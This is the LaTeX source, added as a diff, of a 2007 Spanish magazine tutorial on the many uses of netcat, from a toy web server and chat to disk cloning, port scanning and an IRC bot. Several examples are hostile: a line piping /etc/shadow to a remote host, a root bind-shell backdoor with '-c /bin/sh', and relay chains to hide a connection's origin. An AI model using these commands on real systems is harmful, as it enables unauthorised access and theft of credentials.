@@ -1,0 +1,507 @@
+% Este fichero es parte del Número 1 de la Revista Occam's Razor
+% Revista Occam's Razor Número 1
+%
+% (c) 2007, Occam's Razor.
+% Contenido disponible bajo licencia Reconocimiento-No comercial-Compartir bajo la misma licencia 2.5 España de Creative Commons. Para ver una copia de esta licencia, visite http://creativecommons.org/licenses/by-nc-sa/2.5/es/ o envie una carta a Creative Commons, 559 Nathan Abbott Way, Stanford, California 94305, USA.
+% 
+
+% Sección Malas Bestias
+%
+% Incluye imagen del artículo
+\rput(1,-3.0){\epsfbox{navaja.eps}}
+
+% --------------------------------------------------------
+% Cabecera
+\begin{flushright}
+\msection{introcolor}{black}{0.18}{MALAS BESTIAS}
+
+\mtitle{8cm}{NetCat: La navaja suiza de la Red}
+
+\msubtitle{12cm}{Usos curiosos de esta potente herramienta}
+
+{\sf por Er Manitas}
+
+{\psset{linecolor=black,linestyle=dotted}\psline(-12,0)}
+\end{flushright}
+
+\vspace{2mm}
+% --------------------------------------------------------
+
+\begin{multicols}{2}
+
+% Definición de colores
+% FIXME: La definición en portada.tex no propaga.
+\definecolor{introcolor}{rgb}{0.6,0.7,0.3}
+\definecolor{titlecolor}{rgb}{0.4,0.5,0.1}
+\definecolor{excolor}{rgb}{0.8,0.8,0.8}
+
+% Introducción
+\colorbox{introcolor}{
+\begin{minipage}{.9\linewidth}
+
+{{\resizebox{!}{1.0cm}{N}}{etcat es un pequeño programa normalmente
+conocido como {\em la navaja suiza de las redes}, puesto que se trata
+de una herramienta muy versátil y útil. En este artículo veremos
+algunos de los usos {\em no tan comunes} de esta herramienta.
+}}
+
+\end{minipage}
+}
+
+\vspace{4mm}
+
+% Cuerpo del artículo
+
+\sectiontext{white}{black}{NETCAT: nc}
+
+Si ya, el nombre no tiene nada que ver con los gatos, pero mola
+¿eh?. Como muchos os imaginareis, netcat pretende ser la versión para
+redes del conocido comando {\em cat}, por una parte por su orientación
+al manejo de texto (como tantas herramientas UNIX) y por otra por su
+tremenda sencillez.
+
+En poco más de 17Kb (parece ridículo ¿no?) esta herramienta es capaz de
+realizar auténticas proezas con una sencillez impresionante. Antes de
+meternos de lleno en su uso, una última recomendación: Descargar el
+código fuente y echarle un vistado no es ninguna pérdida de tiempo.
+
+\sectiontext{white}{black}{LO BÁSICO}
+
+Para abrir boca vamos a presentar el uso más básico del programa, para
+luego ver todas las posibilidades que nos ofrece. Lo primero
+que debemos saber, es que {\em netcat} puede trabajar tanto como cliente
+como servidor, dependiendo de los parámetros que pasemos.
+
+Cuando se utiliza como cliente sin más, funciona igual que el
+programa {\tt telnet}, solo tenemos que darle el nombre o dirección IP
+de la máquina a la que queremos conectarnos seguida del puerto que queremos utilizar.
+
+Cuando se utiliza como servidor es necesario utilizar el flag {\tt -l} y el
+flag {\tt -p} seguido del puerto en el que queremos que el servidor acepte
+conexiones. Veamos un sencillo ejemplo. En una consola escribimos el
+siguiente comando:
+
+\begin{mexample}
+\small\tt
+nc -l -p 8080
+\end{mexample}
+
+El programa se quedará esperando conexiones en el puerto 8080. Ahora
+coged vuestro navegador preferido e introducid la siguiente URL: 
+
+\bigskip
+\texttt{http://127.0.0.1:8080}
+\bigskip
+
+Netcat os mostrará por consola algo parecido a la figura 1.
+
+Bueno, pues todo eso que veis ahí abajo es la información que envía
+vuestro navegador cada vez que os conectáis a una página web, en otras
+palabras esto es una petición HTTP.
+
+El navegador quedará esperando la respuesta del servidor web (nuestro
+humilde nc en este caso), así que, démosle una respuesta. En la consola
+en la que hemos lanzado el netcat, escribid algo como esto:
+
+\begin{verbatim}
+<h1>Hola Mundo!!!</h1>
+\end{verbatim}
+
+\begin{entradilla}
+{\it ``{\color{titlecolor}{Netcat puede trabajar como cliente o servidor}}
+dependiendo de los parámetros que reciba''}
+\end{entradilla}
+
+Y seguidamente pulsad las teclas control (CTRL) y C, para parar netcat
+y cerrar la conexión. Ahora mirad que aparece en vuestro navegador :o.
+
+\sectiontext{white}{black}{MENSAJERÍA INSTANTÁNEA}
+
+Vamos ahora con una aplicación un poco más curiosa, utilizar nuestro
+netcat para sustituir esos pesados programas de mensajería instantánea
+con tantos gráficos y ventanas y todo eso.
+
+Para montar este sencillo sistema, uno de los interlocutores debe
+lanzar netcat como servidor, y el otro como cliente en un puerto
+determinado, algo tal que así:
+
+
+\end{multicols}
+
+
+\begin{figure}[ht]
+\hrule
+\vspace{2mm}
+\scriptsize\tt
+\begin{verbatim}
+GET / HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050513 Debian/1.7.8-1
+Accept:text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+\end{verbatim}
+\hrule
+\centering{\em Figura 1. Datos enviados por nuestro browser}
+
+\end{figure}
+
+\pagebreak
+
+\bOpage{introcolor}{0.18}{MALAS BESTIAS}
+
+\begin{verbatim}
+Usuario 1: nc -l -p 5000
+Usuario 2: nc IP_USUARIO1 5000
+\end{verbatim}
+
+
+Si no tenéis amiguitos en internet podéis hablar con vosotros mismos
+sustituyendo {\tt IP\_USUARIO1} por 127.0.0.1.
+
+Sencillo ¿no?... No está nada mal para 17Kb.
+
+\sectiontext{white}{black}{REDIRECCIÓN REMOTA}
+
+Muchos estaréis acostumbrados a utilizar {\em pipes} para redirigir la
+salida de un programa a un fichero o a otro programa que filtre esos
+datos, cosas como:
+
+{\small
+\begin{verbatim}
+cat mi_fichero | sort | uniq | \
+sed -e 's/Pepe/Manolo/g' > resultado.txt
+\end{verbatim}
+}
+
+\begin{entradilla}
+{\em ``{\color{titlecolor}{Es muy sencillo hacer backups por red}} de imágenes
+completas de dispositivos utilizando Netcat y dd''}
+\end{entradilla} 
+
+
+Pues ¿que os parecería poder redirigir la salida de los programas a
+otra máquina?, guay ¿no?, pues nada más fácil. En la máquina en la que
+queréis recibir la salida de un programa lanzáis netcat como servidor
+en el puerto que más rabia os dé. Eso ya deberíais saber hacerlo solos
+:).
+
+En el otro extremo pues solo tenéis que hacer:
+
+{\small
+\begin{verbatim}
+cat /etc/shadows | nc host puerto
+\end{verbatim}
+}
+
+¿Quien necesita el ftp para sacar fichero de una máquina?. Si ya,
+diréis. Pero eso son solo unas pocas líneas de texto... ¿o no?
+
+\sectiontext{white}{black}{COMPRANDO UN NUEVO ORDENADOR}
+
+Bueno, no se vosotros, pero normalmente, cuando yo cambio de ordenador
+el disco duro del viejo se puede copiar sin problemas en la monstruosa
+máquina que nos acabados de comprar (o regalar, o tocar en un concurso
+de la tele, o agenciar, o...).
+
+Así que por qué perder el tiempo seleccionando ficheros para que
+siempre se nos olvide algún directorio oculto con las claves privadas
+que necesitas para... bueno, eso no tiene importancia.
+
+Pues nada más sencillo. En nuestro nuevo ordenador ejecutamos netcat
+de la siguiente forma:
+
+\begin{mexample}
+\small
+\begin{verbatim}
+nc -l -p 5000 > particion1.iso
+\end{verbatim}
+\end{mexample}
+
+Y en nuestro obsoleto ordenador que vamos a vacapear :), ejecutaremos
+algo como esto:
+
+\begin{mexample}
+\small
+\begin{verbatim}
+dd if=/dev/hda1 | nc nuevo_ordenador 5000
+\end{verbatim}
+\end{mexample}
+
+Que pasada!!!!. Bueno, ya hablaremos de {\tt dd} en otra ocasión. Otra
+mala bestia. 
+
+Ahora simplemente necesitamos montar nuestro fichero .iso
+para tener una copia exacta del disco duro de nuestra vieja máquina, 
+con una línea como esta:
+
+\begin{mexample}
+\small
+\begin{verbatim}
+# mkdir /mnt/el_viejo
+# mount -o loop particion1.iso /mnt/el_viejo
+\end{verbatim}
+\end{mexample}
+
+Y en {\tt /mnt/el\_viejo} tendríamos exactamente la partición de nuestro viejo ordenador.
+
+\sectiontext{white}{black}{COMO EN LAS PELIS}
+
+En las pelis de {\em hackers}, siempre llega un momento en el que los
+buenos están intentando localizar al malo y en un mapa del mundo se
+pueden ver unos puntos rojos unidos por unas líneas que se van
+poniendo verdes mientras localizan a los malos.
+
+No está nada claro que es lo que hace el malo de la película, pero
+podría utilizar netcat para hacer todos esos saltos por todas esas
+máquinas de todo ese mundo... eso si, consiguiendo un acceso shell
+primero. 
+
+Y como se haría esto?, pues {\em empipando} el netcat a otro netcat.
+
+Supongamos que tenemos cinco máquinas. La máquina1 es la nuestra, y la
+máquina5 es la máquina de los buenos que nos van a localizar. La
+secuencia de comandos que tendríamos que ejecutar sería la siguiente:
+
+\begin{mexample}
+\small
+\begin{verbatim}
+Maquina4:  nc -l -p 5004 | nc maquina5 puesto_destino
+Maquina3:  nc -l -p 5003 | nc maquina4 5004
+Maquina2:  nc -l -p 5002 | nc maquina3 5003
+Maquina1:  nc maquina2 5002
+\end{verbatim}
+\end{mexample}
+
+De esta forma nos conectaríamos al puerto {\tt puerto\_destino} de la
+máquina5 dando 3 saltos (sin contar el inicial). En realidad estas cosas no se hacen así,
+pero en caso de apuro... nunca se sabe.
+
+\begin{entradilla}
+{\em ``Con una sola línea y Netcat {\color{titlecolor}{podemos preparar un backdoor para acceso shell}} a cualquier máquina''}
+\end{entradilla}
+
+\sectiontext{white}{black}{PUERTAS TRASERAS}
+
+Una puerta trasera, más conocida por su término anglosajón {\em
+backdoor}, es cualquier mecanismo que permita un acceso sencillo a un
+sistema si se sabe cual es la puerta.
+
+Normalmente su utilidad es la de proporcionar un acceso rápido a los
+malvados crackers a las máquinas que ya han crackeado, básicamente para
+no tener que volver a hacerlo. En estos casos, lo que interesa es un
+acceso shell como root para tener total control sobre la máquina.
+
+\ebOpage{introcolor}{0.18}{MALAS BESTIAS}
+
+Y como hacemos esto con netcat?. Si comprobamos las opciones del programa,
+veremos que hay dos clasificadas como {\em dangerous}... pues como
+somos así ahí nos vamos directamente.
+
+{\small
+\begin{verbatim}
+nc -l -p 5000 -c /bin/sh
+\end{verbatim}
+}
+
+La opción {\tt -c} le dice a netcat que ejecute el programa que se indica a continuación cuando recibe una conexión. Bueno, en realidad la cosa es un poco más complicada, pero ahora no es el momento de profundizar en este tema.
+
+Si el comando anterior se ha lanzado como root, podremos hacer cosas como:
+
+{\small
+\begin{verbatim}
+mi_maquinilla$ nc pobrecillo 5000
+whoami
+root
+cd /etc
+cat /etc/passwd
+...
+mi_maquinilla$
+\end{verbatim}
+}
+
+Es un poco incómodo porque no tenemos prompt, pero hay pocas cosas más
+sencillas.
+
+\begin{entradilla}
+{\em ``Netcat permite {\color{titlecolor}{preparar Backdoors, escanear puertos o realizar Port Knocking}} de una forma muy sencilla''}
+\end{entradilla}
+
+
+\sectiontext{white}{black}{ESCANEANDO PUERTOS}
+
+Como no podía ser de otra forma, Netcat también puede ser utilizado
+para escanear puertos, es decir, para saber si un determinado puerto,
+y normalmente servicio, de una determinada máquina está activo.
+
+
+Para esta tarea vamos a utilizar el flag -z para {\em Entrada/Salida
+Nula}, es decir, en este modo, Netcat no va a esperar datos de la
+entrada estándar ni va a mostrarlos en la salida estándar. Veamos como
+hacer esto.
+
+{\small
+\begin{verbatim}
+# nc -z maquina 80 && echo ``Servicio Web Activo''
+\end{verbatim}
+}
+
+Es decir, NetCat retorna un código de error si no puede establecer una conexión. Los
+caracteres \&\& representan el operador {\tt AND} lógico para la shell, el cual tiene
+la peculiaridad de que si el primer operando es 0 ó falso, ya no
+evalúa el segundo (no es necesario, ya que el resultado será falso
+independientemente del valor del segundo operador). 
+
+Así, si netcat no puede establecer la conexión y devuelve un código de
+error, el siguiente comando, el que muestra el mensaje no se
+ejecutará. 
+
+Combinando esto que acabamos de ver con un poco de {\em scripting} es
+muy sencillo montar un rudimentario escaneador de puertos. 
+
+\columnbreak
+
+\sectiontext{white}{black}{KNOCK, KNOCK, KNOCKING ON NETCAT DOOR}
+
+Una versión particular de los backdoors es la técnica conocida como
+{\em Port Knocking}, algo así como llamar a la puerta por los
+puertos. 
+
+Esta técnica se basa en ejecutar un cierto comando,
+normalmente levantar un servicio o abrir un puerto en un firewall,
+cuando se recibe una serie de intentos de conexión a un determinado
+conjunto de puertos en una determinada secuencia.
+
+Lo que vamos a describir aquí es una aproximación muy simple al
+proceso, pero con un poco de {\em scripting} y haciendo que el cliente
+envíe algunos datos, podríamos aproximarnos bastante... pero eso queda
+como ejercicio.
+
+Veamos como se haría.
+
+En la máquina destino, en la que se ejecutará la acción que nos
+interesa, solo tenemos que lanzar una secuencia de comandos similar a
+la siguiente: 
+
+{\small
+\begin{verbatim}
+nc -l -p 500 && nc -l -p 400 && echo "Hola Mundo"
+\end{verbatim}
+}
+
+Ahora, si desde nuestro cliente, nos conectamos primero al puerto 500
+y luego al 400, en la máquina servidor se mostrará un flamante ``Hola
+Mundo'' en la consola. Con lo que ya hemos comentado respecto al
+operador \&\&, la línea anterior no debería requerir mayor
+explicación. 
+
+Sencillo?.... Rudimentario??... Sí. Pero también inquietante.
+
+\sectiontext{white}{black}{HORA BOT}
+
+Hasta ahora hemos estado utilizando netcat directamente desde la línea
+de comandos, sin embargo, combinado con un lenguaje de programación,
+las posibilidades se multiplican.
+
+En el siguiente ejemplo se muestra un sencillo script shell que
+implementa un patético Bot para el IRC que cada 5 minutos da la hora
+local en un determinado canal.
+
+\begin{mexample}
+\small\sf
+\begin{verbatim}
+#!/bin/sh
+
+while (true) do
+HORA=`date +%H:%M`
+cat << EOM | nc servidor_irc 6667
+USER HoraBot 0 * :Soy el Bot que da la hora
+NICK HoraBot
+JOIN #un_canal_cualquiera
+PRIVMSG #un_canal_cualquiera : Son las $HORA y sereno
+QUIT
+EOM
+sleep 300
+done;
+\end{verbatim}
+\end{mexample}
+%$
+
+Como podéis ver, este sencillo script SHELL, repite infinitamente un
+bucle en el que se conecta a una determinada máquina y transmite una
+serie de comandos del IRC utilizando Netcat. Luego espera 5 minutos y
+vuelve a repetir el proceso.
+
+\eOpage
+
+\rput(13.35,-12){\resizebox{!}{20cm}{{\epsfbox{lector-1.eps}}}}
+\rput(9.0,-23){\resizebox{!}{8.8cm}{{\epsfbox{autopromo.eps}}}}
+
+
+\bOpage{introcolor}{0.18}{MALAS BESTIAS}
+
+Los interesados en el protocolo del IRC pueden dirigirse al RFC
+apropiado, o esperar a que hagamos un artículo guay en la revista,
+allá tu y tu impaciencia.
+
+Respecto a este último ejemplo, comentaros que en algunos servidores
+de IRC requieren un mensaje {\tt PONG} durante la autenticación, con
+lo cual el script anterior no funcionaría. De todas formas, podéis
+probar con otros protocolos como SMTP o HTTP, por ejemplo. 
+
+\sectiontext{white}{black}{PARA TERMINAR}
+
+En este pequeño artículo hemos visto algunas aplicaciones más o menos
+curiosas y/o útiles del programa netcat. En la propia distribución del
+programa podréis encontrar un directorio con varios scripts que hacen
+cosas más complicadas que las que hemos descrito aquí, y también mucho
+más interesantes.
+
+Recordaros, una vez más, que netcat es uno de esos programas que merece
+la pena estudiar y con el que se pueden aprender unas cuantas cosas
+sobre como desarrollar aplicaciones en red, si bien, el estilo del
+código es un poco para gustos.
+
+\bigskip
+
+\colorbox{excolor}{
+\begin{minipage}{.9\linewidth}
+{\bf\sf\Large LECTORES}
+\vspace{1mm}
+\hrule
+\bigskip
+
+
+Recordad que podéis enviarnos vuestros experimentos con netcat, y los
+más interesantes, curiosos y güays los publicaremos en el próximo
+número. 
+
+Todavía somos pobres para hacer concursos hasta que consigamos
+patrocinadores con pasta... Pero bueno, por lo que te ha costado esta
+revista te puedes estirar un poco no?
+
+Podéis enviar vuestras propuestas a:
+
+\bigskip
+
+{\tt occams-razor@uvigo.es}
+
+\bigskip
+
+A domar esta mala bestia
+
+\bigskip
+
+\end{minipage}
+}
+
+
+\raggedcolumns
+\pagebreak
+\end{multicols}
+
+
+\clearpage
+\pagebreak
